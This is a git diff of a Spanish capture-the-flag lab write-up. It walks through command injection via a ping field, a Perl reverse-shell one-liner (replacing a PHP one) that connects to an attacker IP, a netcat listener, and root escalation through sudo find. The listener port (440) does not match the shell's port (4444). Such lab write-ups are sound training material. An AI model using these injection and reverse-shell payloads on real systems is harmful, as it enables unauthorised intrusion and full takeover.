@@ -93,52 +93,55 @@ Probamos a ejecutar un comando ping y seguido un ls para ver si nos lo ejecuta y
 <br><br>
 
 Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
-Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dijo que somos ese usuario.
+Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dice que somos ese usuario.
 
 
 <img width="1665" height="593" alt="10" src="https://github.com/user-attachments/assets/aecc21c9-72bf-4125-a7b8-e18a1f86bfc2" />
 <br><br>
 
-Verificamos que esta sea la respuesta a la primera pregunta y es correcto.
+Verificamos que esta sea la respuesta a la primera pregunta que nos hicieron y es correcta.
 <img width="686" height="272" alt="11ingredientee" src="https://github.com/user-attachments/assets/f33c898b-53a2-4147-b000-6e2617843e58" />
 <br><br>
-Ahora vamos a mirar la pista, está en un fichero llamado clue.txt
+
+Ahora vamos a mirar un fichero que descubrimos con el ls anterior llamado clue.txt, ya que su nombre es pista.
 <img width="1518" height="557" alt="11png" src="https://github.com/user-attachments/assets/1152255a-d1f9-44b6-a6c8-0554309b7b10" />
 <br><br>
 
-Entramos al directorio del usuario....
-
-```bash
-127.0.0.1 ;  cat /home/web-admin/user.txt
-```
-
+Nos dice que busquemos por el sistema de archivos el otro ingrediente, así que vamos a listar todo lo que tiene el usuario rick en su carpeta personal
+<img width="1507" height="531" alt="13sefundo" src="https://github.com/user-attachments/assets/9cb25288-b407-4771-8fff-e285ee9751e4" />
 <br><br>
 
-La flag es correcta, vamos a continuar obteniendo una consola más interactiva para poder escalar privilegios más fácilmente.
+Hay un fichero llamado second ingredients, leemos su contenido
+<img width="1536" height="633" alt="14" src="https://github.com/user-attachments/assets/dfeee5fc-2470-4614-a4c4-fe85fa609fdf" />
+<br><br>
 
-
+Comprobamos si esta es la respuesta al segundo ingrediente que nos piden y es correcta. Vamos a continuar buscando el tercer y último ingrediente. Para ello vamos a escalar privilegios obteniendo una consola más interactiva.
+<img width="670" height="369" alt="14siiiii" src="https://github.com/user-attachments/assets/01a6f163-eb53-4e7c-857f-df7fb2c2b732" />
 <br><br>
 
 
 ### Intrusión (Reverse Shell)
 Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:
 
-```php
+```perl
 # Comando ejecutado en el navegador web
-127.0.0.1; php -r '$sock=fsockopen("172.17.0.1",440);exec("/bin/bash <&3 >&3 2>&3");'
+perl -e 'use Socket;$i="10.128.173.235";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 ```
 
+<img width="1291" height="814" alt="15" src="https://github.com/user-attachments/assets/06564cc3-1f04-45d9-85dc-02850f416343" />
 <br><br>
 
 
 Ponemos nuestro *netcat* a la escucha para recibir la conexión:
+
 ```bash
 sudo nc -lvnp 440
 ```
 
+<img width="1131" height="750" alt="1666" src="https://github.com/user-attachments/assets/5a3c285f-3ba0-4cb0-8a47-89b06596ad04" />
 <br><br>
 
-Ya somos el usuario web-admin desde una terminal, ahora podemos sanitizarla o continuar así, se ve peor pero como anteriormente vimos que con sudo -l podíamos ejecutar find sin contraseña como el usuario root, vamos a escalar privilegios.
+Ya somos el usuario web-admin desde una terminal, ahora procedemos a sanitizarla.
 
 ```bash
 # Tratamiento de  la TTY para tener una consola interactiva cómoda
@@ -149,15 +152,26 @@ reset xterm
 export TERM=xterm
 ```
 
+<img width="736" height="296" alt="16sanitizar" src="https://github.com/user-attachments/assets/111fb8a0-ba65-42b4-b43e-67be7fd9339a" />
+<br><br>
+
 
 ## 👑 3. Escalada de Privilegios
 
 ### Enumeración del Sistema
 
+
 ```bash
 # Comprobamos privilegios de SUDO
 sudo -l
 ```
+
+Comenzamos comprobando si tenemos permisos con sudo -l y podemos ejecutar find sin contraseña como el usuario root.
+
+<img width="879" height="414" alt="17" src="https://github.com/user-attachments/assets/5efb0307-a014-4be4-92ff-54914985891c" />
+<br><br>
+
+
 ---
 
 ### Explotación del Vector de Escalada
@@ -168,21 +182,16 @@ Nos aprovechamos del permiso configurado en sudoers que tenemos, para ejecutar f
 sudo find . -exec /bin/sh \; -quit
 ```
 
-<br><br>
 
 
-¡Ya somos **root**! 🚩 Buscamos la flag en la carpeta personal de root.
-
+Conseguimos ser *root* Buscamos la flag en la carpeta personal de root.
+<img width="664" height="518" alt="18clave3 - copia" src="https://github.com/user-attachments/assets/de075313-8a68-4268-8fc7-e9f364f7bf76" />
 <br><br>
 
 Por último, validamos la flag obtenida.
 
+<img width="1047" height="405" alt="Final" src="https://github.com/user-attachments/assets/b74ba8dc-a92d-4326-a0ae-3c730c214827" />
 
-
-
-
-
-perl -e 'use Socket;$i="10.128.173.235";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 
 
 
